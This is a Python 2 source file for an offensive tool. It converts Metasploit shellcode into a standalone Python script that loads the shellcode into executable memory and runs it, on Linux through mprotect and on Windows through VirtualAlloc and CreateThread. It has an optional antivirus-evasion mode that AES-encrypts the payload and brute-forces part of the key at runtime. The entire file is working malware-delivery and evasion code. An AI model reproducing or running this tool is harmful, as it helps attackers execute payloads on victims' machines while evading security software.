#!/usr/bin/python

import argparse
import re

from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Random import random
import base64
import os
import sys

def crypt(SHELL, brutelen=7, alphanum=False):
    nums = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    if alphanum:
	keyspace = nums + alpha + alpha.upper()
    else:
	keyspace = nums
    BLOCK_SIZE = 16
    BRUTE_LENGTH = brutelen
    PADDING = '\x00'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    #DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
    decoded = ''
    secret = Random.new().read(BLOCK_SIZE-BRUTE_LENGTH)
    secret += ''.join(random.choice(keyspace) for i in range(BRUTE_LENGTH))
    #print secret
    IV = Random.new().read(16)
    checkstring = ''.join(random.choice(nums+alpha) for i in range(BLOCK_SIZE))
    cipher = AES.new(secret)
    encoded = EncodeAES(cipher, SHELL) 
    control = cipher.encrypt(checkstring)
    encoded += secret[:-BRUTE_LENGTH] + control + checkstring
    encoded = base64.b64encode(encoded)
    return encoded

parser = argparse.ArgumentParser(description='Generate a Python shellcode delivery script from a Metasploit (msfpayload/msfvenom) payload'
	+ ' (only C output format will be parsed successfully)')
parser.add_argument('-if', '--infile', metavar='infile', type=str, nargs='?',
                   help='file to read payload from')
parser.add_argument('-of', '--outfile', dest='outfile', metavar='outfile',type=str, nargs='?',
                   help='output file (otherwise stdout)')
parser.add_argument('-c', '--crypt', action='store_true', help='use an hyperion/veil like evasione (AES + key bruteforce)')
parser.add_argument('-p', '--platform', metavar='platform', type=str, nargs='?', help='payload execution platform (Linux/Windows)')
parser.add_argument('-bl', '--brute-length', metavar='brutelen', type=int, nargs='?', default=7, help='number of bytes of the key to be bruteforced (sugg. 5-7)')
parser.add_argument('-t','--thread', action='store_true', help='execute shellcode in a separate thread')
parser.add_argument('-an','--alphanumeric', action='store_true', help='set the to-be-bruteforced string alphanumeric (currently not working)')
args = parser.parse_args()


if args.platform is None:
    print '[Error] Platform not selected'
    parser.print_help()
    sys.exit(1)

if args.infile is not None:
    try:
	infile = open(args.infile,'r')
    except:
	print '[Error] Cannot open infile'
	parser.print_help()
	sys.exit(1)
else:
    infile = sys.stdin

shellcode = ''
tmpshell= []
reg = re.compile('".*"')
for line in infile:
    if line[0] in '[*#' or len(line) < 1 or not re.search(reg,line):
	continue
    try:
	tmp = re.findall(reg,line.strip())[0]
	#print tmp
    except:
	print '[Error] Cannot parse payload, maybe try another encoder'
	print line
	sys.exit(1)
    tmpshell.append(tmp[1:-1])
    
shellcode = ''.join(tmpshell)
print tmpshell
if args.crypt:
    shellcode = crypt(shellcode,args.brute_length,args.alphanumeric)

# generate script


if args.outfile is not None:
    try:
	outfile = open(args.outfile,'w')
    except:
	print '[Error] Cannot open outfile'
	sys.exit(1)
else:
    outfile = sys.stdout

outfile.write("from ctypes import *\n")
outfile.write("import ctypes\n")
outfile.write("import os\n")
outfile.write("import sys\n")
if args.thread and args.platform.lower() == 'linux':
    outfile.write("import thread\n")
if args.alphanumeric:
    outfile.write("import itertools\n")

if args.crypt:
    outfile.write("from Crypto.Cipher import AES\n")
    outfile.write("from Crypto import Random\n")
    outfile.write("from Crypto.Random import random\n")
    outfile.write("import base64\n")
    outfile.write("\n")
    outfile.write("def force_shell(encoded):\n")
    outfile.write("    BLOCK_SIZE = 16\n")
    outfile.write("    BRUTE_LENGTH = " + str(args.brute_length) + "\n")
    outfile.write("\n")
    outfile.write("    PADDING = '\\x00'\n")
    outfile.write("\n")
    outfile.write("    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING\n")
    outfile.write("\n")
    outfile.write("    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))\n")
    outfile.write("    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)\n")
    outfile.write("    decoded = ''\n")
    outfile.write("    encoded = base64.b64decode(encoded)\n")
    outfile.write("    check2 = encoded[-BLOCK_SIZE:]\n")
    outfile.write("    encoded = encoded[:-BLOCK_SIZE]\n")
    outfile.write("    rcontrol = encoded[-(BLOCK_SIZE):]\n")
    outfile.write("\n")
    outfile.write("    encoded = encoded[:-(BLOCK_SIZE)]\n")
    outfile.write("\n")
    outfile.write("    known_secret = encoded[-(BLOCK_SIZE - BRUTE_LENGTH):]\n")
    outfile.write("\n")
    outfile.write("    encoded = encoded[:-(BLOCK_SIZE - BRUTE_LENGTH)]\n")
    outfile.write("\n")
    outfile.write("    decoded2 = ''\n")
    if not args.alphanumeric:
	outfile.write("    brute = 0\n")
	outfile.write("    while decoded2 != check2:\n")
	outfile.write("        tmppass = known_secret + str(brute) + '0'*(BRUTE_LENGTH - len(str(brute)))\n")
	outfile.write("        brute += 1\n")
    else:
	outfile.write("    nums = '0123456789'\n")
	outfile.write("    alpha = 'abcdefghijklmnopqrstuvwxyz'\n")
	outfile.write("    for brute in itertools.combinations(nums+alpha+alpha.upper(),BRUTE_LENGTH):\n")
	outfile.write("        if decoded2 == check2:\n")
	outfile.write("            break\n")
	outfile.write("        tmppass = known_secret + ''.join(brute)\n")
    outfile.write("\n")
    outfile.write("        try:\n")
    outfile.write("            cipher2 = AES.new(tmppass)\n")
    outfile.write("        except:\n")
    outfile.write("            sys.exit(1)\n")
    outfile.write("        decoded2 = cipher2.decrypt(rcontrol)\n")
    outfile.write("    decoded = DecodeAES(cipher2, encoded)\n")
    outfile.write("    return decoded\n")
    outfile.write("\n\n")

if args.platform.lower() == 'linux':
    outfile.write("def executable_code(buffer):\n")
    outfile.write("\n")
    outfile.write("    # Some constants\n")
    outfile.write("    PROT_READ = 1\n")
    outfile.write("    PROT_WRITE = 2\n")
    outfile.write("    PROT_EXEC = 4\n")
    outfile.write("\n")
    outfile.write("    buf = c_char_p(buffer)\n")
    outfile.write("    size = len(buffer)\n")
    outfile.write("    # Need to align to a page boundary, so use valloc\n")
    outfile.write("    addr = libc.valloc(size)\n")
    outfile.write("    addr = c_void_p(addr)\n")
    outfile.write("\n")
    outfile.write("    if 0 == addr:\n")
    outfile.write("        raise Exception(\"Failed to allocate memory\")\n")
    outfile.write("\n")
    outfile.write("    memmove(addr, buf, size)\n")
    outfile.write("    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):\n")
    outfile.write("        raise Exception(\"Failed to set protection on buffer\")\n")
    outfile.write("    return addr\n")
    outfile.write("\n\n")
    outfile.write("libc = CDLL('libc.so.6')\n")
else:
    outfile.write("VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc\n")
    outfile.write("VirtualProtect = ctypes.windll.kernel32.VirtualProtect\n")
    outfile.write("CreateThread = ctypes.windll.kernel32.CreateThread\n")
    outfile.write("RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory\n")
    outfile.write("WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject\n")
if args.crypt:
    outfile.write("CRYPTSHELL = \"" + shellcode + "\"\n")
    outfile.write("tempshell = force_shell(CRYPTSHELL)\n")
    outfile.write("arr = []\n")
    outfile.write(r"for i in tempshell.split('\\x'):")
    outfile.write("\n")
    outfile.write("    if len(i) > 1:\n")
    outfile.write("        arr.append(int(i,16))\n")
    outfile.write("shellcode = str(bytearray(arr))\n")
else:
    outfile.write("shellcode = \"" + shellcode + "\"\n")
if args.platform.lower() == 'linux':
    outfile.write("memorywithshell = executable_code(shellcode)\n")
    outfile.write("shell = cast(memorywithshell, CFUNCTYPE(c_void_p))\n")
    if args.thread:
	outfile.write("thread.start_new_thread(shell(), ())\n")
    else:
	outfile.write("shell()\n")
else:
    outfile.write("shellcode = bytearray(shellcode)\n") #to fix (bytearray(str(bytearray))) does not make much sense
    outfile.write("memorywithshell = VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n")
    outfile.write("buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n")
    outfile.write("old = ctypes.c_long(1)\n")
    outfile.write("VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))\n")
    outfile.write("RtlMoveMemory(ctypes.c_int(memorywithshell),buf,ctypes.c_int(len(shellcode)))\n")
    outfile.write("shell = cast(memorywithshell, CFUNCTYPE(c_void_p))\n")
    if args.thread:
	outfile.write("ht = CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(memorywithshell),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n")
	outfile.write("WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n")
    else:
	outfile.write("shell()\n")
	
